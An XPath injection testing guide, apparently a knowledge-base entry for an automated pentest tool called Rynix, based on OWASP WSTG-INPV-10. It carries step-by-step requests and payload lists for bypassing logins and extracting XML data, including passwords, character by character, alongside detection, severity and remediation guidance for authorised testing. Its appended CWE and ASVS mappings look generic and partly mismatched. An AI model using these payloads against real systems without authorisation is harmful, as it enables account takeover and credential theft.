---
id: WSTG-INPV-10
title: Testing for XPath Injection
category: Input Validation
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection
---

# WSTG-INPV-10: Testing for XPath Injection

## Summary

XPath Injection occurs when user-supplied input is embedded into XPath queries without proper sanitization. XPath is a query language used to navigate and select nodes in XML documents. Applications that use XML for data storage (e.g., user credentials, configuration, product catalogs) and query it with XPath are vulnerable if they construct queries by concatenating user input. Unlike SQL injection, XPath injection has no concept of access control or permissions -- a successful injection can access any data in the entire XML document, including authentication credentials and sensitive configuration.

## Test Objectives

- Identify parameters that are used in XPath queries
- Test if XPath metacharacters can alter query logic
- Determine if authentication can be bypassed via XPath injection
- Assess the extent of data extraction possible through XPath injection

## Prerequisites

- Target application uses XML data stores or queries XML with XPath
- Docker pentest container capturing traffic
- Login forms or search features that may query XML data
- Application may use XML files for configuration, authentication, or data storage

## Test Steps

### Step 1: Identify XPath Injection Points

**CLI Actions:**
1. Use `curl` to identify login forms, search features, and data lookup endpoints
2. Look for application clues suggesting XML backend:
   - Error messages mentioning XPath, XML, or XSLT
   - XML-based APIs or configuration
   - Applications without a traditional database (small apps, embedded systems)
3. Use `save to manual-review file` for each candidate endpoint

### Step 2: Test for XPath Injection with Metacharacters

**CLI Actions:**
Use `curl` to inject XPath metacharacters:

**Single quote to break string context:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin'&password=test
```

If the application returns an XPath-related error message (e.g., "Invalid XPath expression", "XMLException"), the parameter is likely used in an XPath query.

**Double quote test:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin"&password=test
```

### Step 3: Test Authentication Bypass

**CLI Actions:**
If the backend constructs a query like `//users/user[username='USER' and password='PASS']`, use `curl` to bypass:

**Always-true condition:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' or '1'='1&password=admin' or '1'='1
```

**Comment out password check:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' or '1'='1' or '1'='1&password=anything
```

**Bypass using OR logic:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=' or 1=1 or ''='&password=' or 1=1 or ''='
```

Use `curl --data-urlencode` on special characters when testing via GET parameters.

### Step 4: Test Boolean-Based Blind XPath Injection

**CLI Actions:**
Use `curl` to extract data character by character:

**Test if the first character of the first username is 'a':**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' and substring(//users/user[1]/username,1,1)='a' or ''='&password=test
```

**Test if length of first username is 5:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' and string-length(//users/user[1]/username)=5 or ''='&password=test
```

**Count total users:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' and count(//users/user)>0 or ''='&password=test
```

Iterate values by observing response differences (true vs false conditions).

### Step 5: Extract XML Document Structure

**CLI Actions:**
Use `curl` to enumerate the XML document structure:

**Extract root node name:**
```
username=admin' and substring(name(/*[1]),1,1)='u' or ''='
```

**Extract child node names:**
```
username=admin' and substring(name(//users/user[1]/*[1]),1,1)='u' or ''='
```

**Count child elements:**
```
username=admin' and count(//users/user[1]/*)>3 or ''='
```

### Step 6: Test XPath 2.0 Specific Functions

**CLI Actions:**
If the application uses XPath 2.0, use `curl` to test additional functions:

```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=') and matches(//users/user[1]/password, '.*') or ('1'='1
```

```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=') and string-join(//users/user/username, ',')!='' or ('1'='1
```

## Payloads

### Authentication Bypass Payloads
```
' or '1'='1
' or '1'='1' or '1'='1
' or 1=1 or ''='
" or "1"="1
" or 1=1 or ""="
') or ('1'='1
') or true() or ('
' or true() or '
admin' or '1'='1
```

### Boolean-Based Blind Payloads
```
' and '1'='1
' and '1'='2
' and substring(//users/user[1]/username,1,1)='a' or ''='
' and substring(//users/user[1]/password,1,1)='p' or ''='
' and string-length(//users/user[1]/username)=5 or ''='
' and count(//users/user)>1 or ''='
' and count(//users/user)=5 or ''='
```

### Data Extraction Payloads
```
' and substring(name(/*[1]),1,1)='r' or ''='
' and substring(name(//*[1]),1,1)='u' or ''='
' and count(/*)=1 or ''='
' and count(//*)>10 or ''='
' and substring(//users/user[position()=1]/child::node()[position()=2],1,1)='a' or ''='
```

### XPath Function Payloads
```
' or string-length(name(/*))>0 or '1'='1
' or contains(//users/user[1]/username,'admin') or '1'='1
' or starts-with(//users/user[1]/username,'a') or '1'='1
' or normalize-space(//users/user[1]/password)!='' or '1'='1
```

### Error-Inducing Payloads
```
'
"
')
")
]
]]
/
//
*
```

### XPath 2.0 Specific Payloads
```
' and matches(//users/user[1]/password,'.*') or ''='
' and lower-case(//users/user[1]/username)='admin' or ''='
' and tokenize(//users/user[1]/password,'.')[1]='p' or ''='
```

## Detection Criteria

A finding should be logged when:
- XPath error messages are returned when injecting metacharacters
- Authentication is bypassed using XPath injection payloads
- Boolean-based tests produce different responses for true vs false conditions
- Data extraction from the XML document is possible character by character
- Error messages reveal XML structure or XPath query patterns

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Authentication bypass via XPath injection | High |
| Full XML document extraction (passwords, secrets) | High |
| Blind XPath injection confirmed with boolean extraction | High |
| XML structure enumeration without sensitive data | Medium |
| XPath errors reveal query patterns but injection not exploitable | Medium |
| XPath errors disclosed but no confirmed injection | Low |

## Remediation

- Use parameterized XPath queries or precompiled XPath expressions
- Sanitize all user input -- escape single quotes, double quotes, and XPath special characters
- Validate input against strict allowlists (alphanumeric only where possible)
- Avoid using user input directly in XPath query construction
- Consider migrating from XML-based data storage to a proper database with parameterized queries
- Implement application-level error handling that does not expose XPath error details
- Apply least-privilege access to XML data sources

## References

- [OWASP Testing Guide - XPath Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection)
- [CWE-643: Improper Neutralization of Data within XPath Expressions](https://cwe.mitre.org/data/definitions/643.html)
- [OWASP XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

